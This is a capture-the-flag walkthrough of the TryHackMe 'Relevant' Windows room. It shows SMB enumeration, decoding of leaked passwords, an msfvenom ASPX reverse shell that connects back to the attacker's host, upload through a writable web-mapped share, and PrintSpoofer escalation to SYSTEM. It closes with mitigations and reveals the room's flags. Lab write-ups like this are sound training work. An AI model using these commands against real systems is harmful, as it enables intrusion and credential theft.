# Relevant CTF Walkthrough

**Target:** Relevant  
**Source:** [TryHackMe](https://tryhackme.com/room/relevant)  
**Difficulty:** Medium  
**Target IP:** 10.112.165.58

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [SMB Enumeration](#smb-enumeration)
- [Decoding the Password File](#decoding-the-password-file)
- [Finding the Web-Exposed Share](#finding-the-web-exposed-share)
- [Reverse Shell via Writable Share](#reverse-shell-via-writable-share)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root Flag](#root-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Relevant is a medium-difficulty Windows box framed as a black-box penetration
test, with the client noting that more than one path to root exists. The
objective is to capture the user and root flags (no locations provided). The
chain starts with an anonymously accessible — and writable — SMB share
(`nt4wrksv`) holding a Base64-encoded password file. The same share is mapped
into the IIS web root on a non-standard port, so an `.aspx` reverse shell
uploaded over SMB can be triggered through the browser, landing a shell as
`iis apppool\defaultapppool`. That service account holds `SeImpersonatePrivilege`,
which is abused with **PrintSpoofer** to escalate to `nt authority\system`.

**Key Skills Required:**
- Network scanning and service enumeration
- SMB share enumeration and anonymous/writable share discovery
- Base64 decoding of recovered credentials
- Correlating an SMB share with its IIS web path
- Generating and deploying an ASPX reverse shell (msfvenom)
- Windows token-impersonation privilege escalation (`SeImpersonatePrivilege` → PrintSpoofer)

---

## Reconnaissance

### Network Scanning

A version scan exposes a standard Windows web/SMB/RDP footprint:

```bash
nmap -sV 10.112.165.58
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | http | Microsoft IIS httpd 10.0 |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | Windows 7–10 SMB (workgroup: WORKGROUP) |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Services (RDP) |

The host is `RELEVANT`. IIS on 80 and SMB on 445 are the most promising surfaces.

---

## SMB Enumeration

Listing shares anonymously reveals a non-default share, `nt4wrksv`:

```bash
smbclient -L //10.112.165.58
# Password: (blank)
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
```

Connecting to `nt4wrksv` anonymously exposes a password file:

```bash
smbclient \\\\10.112.165.58\\nt4wrksv
smb: \> ls
  passwords.txt    A    98  Sat Jul 25 11:15:33 2020
smb: \> get passwords.txt
```

---

## Decoding the Password File

The file holds Base64-encoded credentials:

```bash
cat passwords.txt
```

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Decode each line:

```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123

echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

> **Recovered credentials:** `Bob : !P@$$W0rD!123` and `Bill : Juw4nnaM4n420696969!$$$`

These accounts don't grant SMB/RDP access directly, so the writable share itself
becomes the foothold vector.

---

## Finding the Web-Exposed Share

The `nt4wrksv` share is writable, and it is also served by IIS. The directory is
reachable on a high IIS port (`49663`), confirming SMB-uploaded files execute as
web content:

```
http://10.112.165.58:49663/nt4wrksv/passwords.txt
```

Because files written to the share appear under the web root, an uploaded ASPX
payload can be executed by browsing to it.

---

## Reverse Shell via Writable Share

Generate an ASPX reverse shell with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.132.9 LPORT=9009 \
  -f aspx > shell.aspx
```

Start a listener:

```bash
rlwrap nc -nvlp 9009
```

Upload the shell to the writable share over SMB:

```bash
smbclient \\\\10.112.165.58\\nt4wrksv
smb: \> put shell.aspx
```

Trigger it through the IIS-mapped path:

```bash
curl http://10.112.165.58:49663/nt4wrksv/shell.aspx
```

A shell returns as the IIS application-pool identity:

```cmd
c:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

> **Foothold:** `iis apppool\defaultapppool`

---

## User Flag

The user flag is on Bob's desktop:

```cmd
c:\Users\Bob\Desktop> more user.txt
```

> **User flag:** `THM{fdk4ka34vk346ksxfr21tg789ktf45}`

---

## Privilege Escalation

IIS application-pool accounts almost always hold `SeImpersonatePrivilege`, which
enables "potato"-style token-impersonation attacks. Stage **PrintSpoofer** on
the box (e.g. download to the writable share):

```bash
# PrintSpoofer64.exe placed in the writable nt4wrksv directory
c:\inetpub\wwwroot\nt4wrksv> PrintSpoofer64.exe -i -c powershell.exe
```

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
PS C:\Windows\system32> whoami
nt authority\system
```

> **Privilege escalation:** `iis apppool\defaultapppool` → `nt authority\system`

> **Note:** The room states there is more than one path to root. PrintSpoofer
> (via `SeImpersonatePrivilege`) is shown here; alternatives include other potato
> variants (RoguePotato/JuicyPotato) or known IIS/Windows kernel exploits.

---

## Root Flag

The root flag is on the Administrator desktop:

```powershell
PS C:\Users\Administrator\Desktop> more root.txt
```

> **Root flag:** `THM{1fk5kf469devly1gl320zafgl345pv}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{fdk4ka34vk346ksxfr21tg789ktf45}` | `C:\Users\Bob\Desktop\user.txt` |
| Root flag | `THM{1fk5kf469devly1gl320zafgl345pv}` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Vulnerabilities

### 1. Anonymous Access to SMB Share (High)

**Description:** The `nt4wrksv` share allowed anonymous (null) read access,
exposing a `passwords.txt` file.

**Impact:** Disclosure of credential material and a foothold vector.

**Mitigation:**
- Require authentication on all shares; disable null sessions.
- Restrict share ACLs to least privilege.

### 2. Weakly-Encoded Credentials at Rest (High)

**Description:** Credentials were stored as Base64 (encoding, not encryption) in
a file on the share.

**Impact:** Trivial recovery of plaintext passwords for `Bob` and `Bill`.

**Mitigation:**
- Never store credentials in files; encoding offers no protection.
- Use a secrets manager and rotate exposed passwords.

### 3. Writable Share Mapped to Web Root (Critical)

**Description:** The `nt4wrksv` SMB share was writable *and* served by IIS, so
files uploaded over SMB could be executed as web content via port 49663.

**Impact:** Remote code execution as `iis apppool\defaultapppool` through an
uploaded ASPX payload.

**Mitigation:**
- Never map writable file shares into a web root.
- Disable script execution in upload directories; separate content from uploads.

### 4. SeImpersonatePrivilege on Service Account (Critical)

**Description:** The IIS application-pool identity held `SeImpersonatePrivilege`,
abusable with PrintSpoofer to impersonate `SYSTEM`.

**Impact:** Full privilege escalation to `nt authority\system`.

**Mitigation:**
- Patch against the relevant token-impersonation vectors.
- Apply least privilege to service accounts; restrict impersonation rights.

---

## Attack Chain Summary

```
Nmap scan → IIS (80), SMB (445), RDP (3389)
    ↓
smbclient -L → nt4wrksv share (anonymous)
    ↓
get passwords.txt → Base64 → Bob / Bill credentials
    ↓
nt4wrksv writable + mapped to IIS (port 49663)
    ↓
msfvenom aspx → put shell.aspx (SMB) → curl trigger
    ↓
shell as iis apppool\defaultapppool
    ↓
User flag: THM{fdk4ka34vk346ksxfr21tg789ktf45}
    ↓
SeImpersonatePrivilege → PrintSpoofer64.exe -i -c powershell.exe
    ↓
nt authority\system
    ↓
Root flag: THM{1fk5kf469devly1gl320zafgl345pv}
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| smbclient | SMB share enumeration, file download, payload upload |
| base64 | Decoding the recovered password file |
| msfvenom | Generating the ASPX reverse shell |
| netcat / rlwrap | Reverse shell listener |
| cURL / browser | Triggering the ASPX payload via IIS |
| PrintSpoofer | SeImpersonatePrivilege → SYSTEM escalation |

---

## References

- [TryHackMe — Relevant](https://tryhackme.com/room/relevant)
- [Nmap](https://nmap.org/)
- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [PrintSpoofer (itm4n)](https://github.com/itm4n/PrintSpoofer)
- [SeImpersonate / Potato attacks](https://jlajara.gitlab.io/Potatoes_Windows_Privesc.html)

---
